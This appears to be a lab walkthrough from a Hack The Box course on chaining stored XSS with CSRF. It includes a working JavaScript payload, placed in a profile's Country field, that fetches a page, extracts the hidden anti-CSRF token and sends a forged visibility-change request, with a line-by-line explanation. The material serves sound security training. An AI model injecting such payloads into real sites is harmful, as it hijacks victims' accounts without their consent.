# XSS & CSRF Chaining

Run Burp Suite as follows.

```shell-session
eldeim@htb[/htb]$ burpsuite
```

By browsing the application, we notice that Ela Stienen can't share her profile. This is because her profile is _private_. Let us change that by clicking "Change Visibility."

Then, activate Burp Suite's proxy (_Intercept On_) and configure your browser to go through it. Now click _Make Public!_.

<figure><img src="../../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>

You should see the below inside Burp Suite's proxy.

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Forward all requests so that Ela Stienen's profile becomes public.

Let us focus on the payload we should specify in the _Country_ field of Ela Stienen's profile to successfully execute a CSRF attack that will change the victim's visibility settings (From private to public and vice versa).

The payload we should specify can be seen below.

```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/app/change-visibility',true);
req.send();
function handleResponse(d) {
    var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/app/change-visibility', true);
    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    changeReq.send('csrf='+token+'&action=change');
};
</script>
```

Let us break things down for you.

Firstly we put the entire script in `<script>` tags, so it gets executed as valid JavaScript; otherwise, it will be rendered as text.

```javascript
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/app/change-visibility',true);
req.send();
```

The script snippet above creates an ObjectVariable called _req_, which we will be using to generate a request. _var req = new XMLHttpRequest();_ is allowing us to get ready to send HTTP requests.

```javascript
req.onload = handleResponse;
```

In the script snippet above, we see the _onload_ event handler, which will perform an action once the page has been loaded. This action will be related to the _handleResponse_ function that we will define later.

```javascript
req.open('get','/app/change-visibility',true);
```

In the script snippet above, we pass three arguments. _get_ which is the request method, the targeted path _/app/change-visibility_ and then _true_ which will continue the execution.

Code: javascript

```javascript
req.send();
```

The script snippet above will send everything we constructed in the HTTP request.

```javascript
function handleResponse(d) {
    var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/app/change-visibility', true);
    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    changeReq.send('csrf='+token+'&action=change');
};
```

The script snippet above defines a function called _handleResponse_.

```javascript
var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];
```

The script snippet above defines a variable called _token_, which gets the value of _responseText_ from the page we specified earlier in our request. `/name="csrf" type="hidden" value="(\w+)"/)[1];` looks for a hidden input field called _csrf_ and \w+ matches one or more alphanumeric characters. In some cases, this may be different, so let us look at how you can identify the name of a hidden value or check if it is actually "CSRF".

Open Web Developer Tools (Shift+Ctrl+I in the case of Firefox) and navigate to the _Inspector_ tab. We can use the _search_ functionality to look for a specific string. In our case, we look for _csrf_, and we get a result.

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

> **Note**: If no result is returned and you are certain that CSRF tokens are in place, look through various bits of the source code or copy your current CSRF token and look for it through the search functionality. This way, you may uncover the input field name you are looking for. If you still get no results, this doesn't mean that the application employs no anti-CSRF protections. There could be another form that is protected by an anti-CSRF protection.

